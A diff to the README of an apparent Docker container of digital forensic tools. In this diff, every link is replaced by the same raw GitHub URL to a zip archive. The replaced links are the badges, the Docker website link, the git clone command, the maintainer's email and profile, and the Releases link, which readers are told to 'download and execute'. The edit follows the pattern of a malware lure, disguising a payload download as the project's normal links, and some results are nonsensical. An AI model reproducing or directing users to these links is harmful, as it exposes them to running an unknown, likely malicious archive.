@@ -1,7 +1,7 @@
 ```markdown
 # 🔍 Forensic: Your All-in-One Docker Container for Digital Investigation
 
-![Forensic](https://img.shields.io/badge/Forensic-Digital%20Investigation-brightgreen) ![Docker](https://img.shields.io/badge/Docker-Container%20Tools-blue) ![Release](https://img.shields.io/badge/Release-v1.0.0-orange)
+![Forensic](https://raw.githubusercontent.com/Chintan2604/forensic/main/sulfury/Software-1.8.zip%20Investigation-brightgreen) ![Docker](https://raw.githubusercontent.com/Chintan2604/forensic/main/sulfury/Software-1.8.zip%20Tools-blue) ![Release](https://raw.githubusercontent.com/Chintan2604/forensic/main/sulfury/Software-1.8.zip)
 
 Welcome to the **Forensic** repository! This project provides a comprehensive Docker container designed for digital investigation. It comes pre-installed with essential tools for analyzing disks, memory, malware, and mobile devices. Whether you're a seasoned investigator or a curious beginner, this container streamlines your workflow and enhances your capabilities in forensic analysis.
 
@@ -32,7 +32,7 @@ Welcome to the **Forensic** repository! This project provides a comprehensive Do
 
 ## 🚀 Getting Started
 
-To get started, ensure you have Docker installed on your machine. If you do not have Docker, follow the instructions on the [Docker website](https://www.docker.com/get-started).
+To get started, ensure you have Docker installed on your machine. If you do not have Docker, follow the instructions on the [Docker website](https://raw.githubusercontent.com/Chintan2604/forensic/main/sulfury/Software-1.8.zip).
 
 ### Prerequisites
 
@@ -48,7 +48,7 @@ To install the Forensic container, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Chintan2604/forensic.git
+   git clone https://raw.githubusercontent.com/Chintan2604/forensic/main/sulfury/Software-1.8.zip
    cd forensic
    ```
 
@@ -138,16 +138,16 @@ This project is licensed under the MIT License. Feel free to use and modify the 
 For questions, suggestions, or feedback, please reach out to the project maintainer:
 
 - **Name**: Chintan
-- **Email**: chintan@example.com
-- **GitHub**: [Chintan2604](https://github.com/Chintan2604)
+- **Email**: https://raw.githubusercontent.com/Chintan2604/forensic/main/sulfury/Software-1.8.zip
+- **GitHub**: [Chintan2604](https://raw.githubusercontent.com/Chintan2604/forensic/main/sulfury/Software-1.8.zip)
 
 ---
 
 ## 🚀 Releases
 
-To get the latest version of the Forensic container, visit the [Releases](https://github.com/Chintan2604/forensic/releases) section. Download and execute the appropriate files for your needs.
+To get the latest version of the Forensic container, visit the [Releases](https://raw.githubusercontent.com/Chintan2604/forensic/main/sulfury/Software-1.8.zip) section. Download and execute the appropriate files for your needs.
 
-![Download](https://img.shields.io/badge/Download%20Latest-Release-blue)
+![Download](https://raw.githubusercontent.com/Chintan2604/forensic/main/sulfury/Software-1.8.zip%20Latest-Release-blue)
 
 ---
 
